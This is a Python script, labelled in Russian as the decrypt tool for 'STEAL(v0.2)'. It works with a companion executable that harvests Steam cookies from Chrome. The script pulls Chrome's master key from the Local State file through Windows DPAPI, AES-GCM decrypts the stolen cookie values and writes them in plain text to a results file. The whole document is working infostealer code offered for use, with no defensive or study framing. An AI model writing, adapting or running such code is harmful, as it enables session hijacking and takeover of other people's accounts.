import os
import json
import base64
import win32crypt
import time
import traceback

# Используем pycryptodomex
from Cryptodome.Cipher import AES

print("="*85)
print("   STEAL(v0.2) — DECRYPT TOOL")
print("="*85)
print("   Окно закроется только после нажатия Enter\n")

encrypted_file = "results/steam_cookies_encrypted.txt"

if not os.path.exists(encrypted_file):
    print("❌ Файл с зашифрованными куки не найден!")
    print("   Сначала запустите steal_v0.2.exe и нажмите '🚀 Запустить сбор куки'")
    input("\nНажмите Enter для выхода...")
    exit()

print(f"✅ Файл найден: {encrypted_file}")

# Получаем мастер-ключ Chrome
master_key = None
local_state = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")

try:
    with open(local_state, "r", encoding="utf-8") as f:
        data = json.load(f)
    os_crypt = data.get("os_crypt", {})
    if "encrypted_key" in os_crypt:
        key = base64.b64decode(os_crypt["encrypted_key"])
        if key.startswith(b"DPAPI"):
            master_key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
            print("✅ Мастер-ключ успешно получен")
except Exception as e:
    print(f"❌ Ошибка получения мастер-ключа: {e}")
    print("   Закройте браузер Chrome полностью!")

if not master_key:
    print("\nНе удалось получить мастер-ключ.")
    input("Нажмите Enter для выхода...")
    exit()

print("Начинаем расшифровку...\n")

output_file = "results/steam_cookies_decrypted.txt"
count = 0

try:
    with open(encrypted_file, "r", encoding="utf-8") as f, open(output_file, "w", encoding="utf-8") as out:
        out.write("=== steal(v0.2) — DECRYPTED STEAM COOKIES ===\n")
        out.write(f"Дата расшифровки: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out.write("=" * 80 + "\n\n")

        for line in f:
            if "Encrypted (base64):" in line:
                try:
                    b64_value = line.split("Encrypted (base64):", 1)[1].strip()
                    encrypted_value = base64.b64decode(b64_value)

                    if encrypted_value[:3] in (b"v10", b"v11", b"v20"):
                        nonce = encrypted_value[3:15]
                        ciphertext = encrypted_value[15:-16]
                        tag = encrypted_value[-16:]

                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        decrypted_text = decrypted.decode("utf-8", errors="ignore")

                        out.write(f"Decrypted Value: {decrypted_text}\n")
                        print(f"✅ {decrypted_text[:85]}{'...' if len(decrypted_text) > 85 else ''}")
                        count += 1
                    else:
                        out.write(line)
                except Exception as inner_e:
                    print(f"Ошибка расшифровки куки: {inner_e}")
                    out.write(line)
            else:
                out.write(line)

    print(f"\nГОТОВО! Успешно расшифровано {count} куки.")
    print(f"Файл сохранён: {output_file}")

except Exception as e:
    print(f"\n❌ Критическая ошибка:")
    print(traceback.format_exc())

print("\n" + "="*85)
print("Нажмите Enter, чтобы закрыть окно...")
input()